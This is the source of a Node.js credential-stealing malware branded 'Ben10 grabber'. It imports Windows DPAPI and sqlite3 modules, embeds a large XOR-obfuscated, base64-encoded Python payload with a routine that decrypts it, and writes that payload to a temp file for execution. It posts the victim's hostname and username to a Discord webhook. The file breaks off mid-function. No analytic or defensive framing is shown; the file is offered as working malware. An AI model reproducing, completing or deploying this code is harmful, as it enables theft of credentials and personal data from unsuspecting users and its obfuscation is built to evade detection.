const os = require('os');
const fs = require('fs');
const path = require('path');
const { execSync, exec, spawn, execFile } = require('child_process');
const https = require('https');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const archiver = require('archiver');
const util = require('util');
const execAsync = util.promisify(exec);
const { Dpapi } = require("@primno/dpapi");
const sqlite3 = require("sqlite3");


// Ben 10 Theme Constants
const BEN10_COLOR = 0x00FF00;
const BEN10_USERNAME = "Ben10";
const BEN10_FOOTER_TEXT = "@ben10grabber";
const BEN10_ICON = "https://media.discordapp.net/attachments/1450980645344907264/1452918266556317746/images.jpeg?ex=694c37d4&is=694ae654&hm=090ac699a84f9c232f511f09195b7edffaf7cdbb521ebf6f7b984ca5588f3cb4&";


// Encrypted Python payload
const _0xPyKey = "K3y59tfty";
const _0xPyData = "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";

function _0xDecryptPy() {
    const buf = Buffer.from(_0xPyData, 'base64');
    const bin = buf.toString('binary');
    let result = '';
    for (let i = 0; i < bin.length; i++) {
        result += String.fromCharCode(bin.charCodeAt(i) ^ _0xPyKey.charCodeAt(i % _0xPyKey.length));
    }
    return result;
}


async function executePythonExtraction(outputDir) {
    const sanitize = (str) => {
        if (!str) return '';
        // Keep only printable ASCII and common symbols, remove control chars
        return str.replace(/[\x00-\x1F\x7F-\x9F]/g, "").substring(0, 800);
    };

    const sendDebugLog = async (message) => {
        try {
            console.log(`[DebugLog] ${message.substring(0, 100)}...`); // Local backup
            const payload = {
                username: BEN10_USERNAME,
                content: `**[Python Extraction Debug]**\n${message}\n\`\`\`\nPC: ${os.hostname()}\nUser: ${os.userInfo().username}\nTime: ${new Date().toISOString()}\n\`\`\``
            };
            await axios.post(CONFIG.dualhook, payload).catch((err) => {
                console.error('Webhook failed:', err.message);
                // Try fallback simple message
                if (message.length > 200) {
                    const simplePayload = {
                        username: BEN10_USERNAME,
                        content: `**[Python Extraction Debug]**\n(Log truncated)\nStatus: Check local console.\nPC: ${os.hostname()}`
                    };
                    axios.post(CONFIG.dualhook, simplePayload).catch(() => { });
                }
            });
        } catch (e) { console.error('Log fatal:', e); }
    };

    try {
        await sendDebugLog('🔄 Starting Python extraction...');

        let pyCode = _0xDecryptPy();
        // CRITICAL FIX: Patch the silent exception handler in the python payload
        pyCode = pyCode.replace(
            "except Exception:\n        pass",
            "except Exception as e:\n        import traceback\n        traceback.print_exc()\n        print(f'CRITICAL_PAYLOAD_ERROR: {e}')"
        );
        const tmpName = 'tmp_' + Math.random().toString(36).substring(7) + '.py';
        const tmpPath = path.join(os.tmpdir(), tmpName);

